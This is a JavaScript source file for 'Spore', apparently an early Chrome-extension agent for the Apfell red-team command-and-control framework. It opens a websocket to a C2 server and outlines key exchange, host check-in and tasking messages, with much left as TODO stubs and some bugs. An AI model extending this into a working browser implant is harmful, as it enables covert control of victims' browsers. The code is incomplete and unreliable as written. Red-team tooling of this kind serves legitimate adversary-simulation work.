// Apfell Spore Core Code
// Author: Chris Ross
// Purpose: Apfell Chrome Extension

// Core Spore Class
class SporeConfiguration {
    constructor(serveraddress, endpoint, port, ssl){
        if (ssl === true) {
            this.serverurl = "wss://"+serveraddress+":"+port+"/"+endpoint;
        } else {
            this.serverurl = "ws://"+serveraddress+":"+port+"/"+endpoint;
        }

        this.apfellID = 0;
        this.keyID = "";
        this.AESKey = [];
        this.RSAPrivateKey = [];
        this.RSAPublicKey = [];
    }
}

const config = new SporeConfiguration("localhost", "websocket", 454, true);
// Helper functions

/// Convert a base64 string to data array
function base64StringToDataArray(data) {
    const byteString = atob(data);
    // write the bytes of the string to an ArrayBuffer
    const ab = new ArrayBuffer(byteString.length);
    const ia = new Uint8Array(ab);
    for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
    }

    return ia;
}

/// Make an HTTP Request
function httpReq(url,method,headers,body)
{
    const xmlHttp = new XMLHttpRequest();
    xmlHttp.open( method, url, false ); // false for synchronous request
    for (const p in headers) {
        if(headers.hasOwnProperty(p)) {
            xmlHttp.setRequestHeader(p, headers[p])
        }
    }
    console.log(body);
    const data_array = base64StringToDataArray(body);
    xmlHttp.send(data_array);
    return xmlHttp;
}

// TODO: Add helper functions to create Key Exchange, Callback Checkin, and Apfell Task Request messages

(function(){
    // Main function
    /// Receives and processes messages

    console.log('New Msg');
    // Add a new listener to continually retrieve messages
    chrome.runtime.onMessage.addListener(function(message, sender, callback) {
        localStorage["data"] = message;
    });
    
    // Connect to the server
    const connection = new WebSocket('ws://localhost/websocket/');
    
    connection.onopen = function() {
        console.log('Connection received');
        // TODO: Add code for creating a key message and then sending the message to the server
        connection.send('init '+ ID);
    };
    
    connection.onclose = function(){
        console.log('Connection closed');
    };

    connection.onerror = function(error){
        console.log('WS Error detected: ' + error);
    };
    
    // handle messages from other events
    connection.onmessage = function (e) {
        // Message format
        // MetaType
        /// 1 - Key Exchange | 2 - Callback Checkin | Apfell Task Message
        // MetaData
        /// Key Exchange - {String : KeyID, Int : Stage, String : Key}
        /// Callback Checkin - {String : KeyID, Int : PID, String : User, String : UUID, String : Host, String : IP}
        /// Apfell Task Message

        const message = JSON.parse(e.data);
        
        switch (message["MetaType"]) {
            case 1 : {
                // Encryption not implemented
                const keyexchangedata = message["MetaData"];
                
                // 2 - Key Exchange Response from the server
                if (keyexchangedata["stage"] === 2) {
                    const decodedkey = base64StringToDataArray(keyexchangedata["key"]);
                    // TODO: Implement RSA decryption
                }
            }
            case 2 : {
                // response to callback check in
                const checkindata = message["MetaData"];
                config.apfellID = checkindata["apfellid"];
            }
            case 3 : {
                // process an apfell message
            }
        }
        
        const msg = JSON.parse(e.data);
        
    }
})();
